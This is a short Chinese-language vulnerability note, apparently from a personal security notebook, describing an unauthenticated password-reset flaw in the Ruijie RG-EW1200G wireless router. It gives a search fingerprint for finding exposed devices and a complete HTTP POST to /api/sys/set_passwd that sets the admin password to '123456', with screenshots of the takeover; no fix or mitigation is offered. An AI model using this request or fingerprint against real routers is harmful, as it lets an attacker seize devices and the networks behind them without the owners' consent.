# 锐捷RG-EW1200G路由器未授权任意密码修改

# <font style="color:rgba(0, 0, 0, 0.9);">一、漏洞简介</font>
<font style="color:rgba(0, 0, 0, 0.9);">锐捷网络RG-EW1200G 存在未授权任意密码修改漏洞，允许任何用户未授权修改密码。登录路由器，获取敏感信息，控制内部网络</font>

# 二、影响版本
+ <font style="color:rgba(0, 0, 0, 0.9);">RG-EW1200G无线路由器</font>

# 三、资产测绘
```plain
body="/static/js/app.09df2a9e44ab48766f5f.js"
```

![1711861011537-b26157a8-4ea8-4b53-9e61-798dd6a3cb05.png](./img/ZZUhORDFnoBu0aNb/1711861011537-b26157a8-4ea8-4b53-9e61-798dd6a3cb05-295961.png)

+ 登录页面

![1711860999021-84f63469-af01-48b1-8a8f-5d94d53d0fd0.png](./img/ZZUhORDFnoBu0aNb/1711860999021-84f63469-af01-48b1-8a8f-5d94d53d0fd0-601664.png)

# 四、漏洞复现
```plain
POST /api/sys/set_passwd HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{"username":"admin","admin_new":"123456"}
```

![1711865641902-da372739-98a1-4b1e-b25e-286ffb287b58.png](./img/ZZUhORDFnoBu0aNb/1711865641902-da372739-98a1-4b1e-b25e-286ffb287b58-292126.png)

![1711861062625-d4b54cd2-b4dc-4d66-a6ea-f5b5d18788af.png](./img/ZZUhORDFnoBu0aNb/1711861062625-d4b54cd2-b4dc-4d66-a6ea-f5b5d18788af-036339.png)



> 更新: 2024-06-24 11:42:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bwyubc8k94kw6h1e>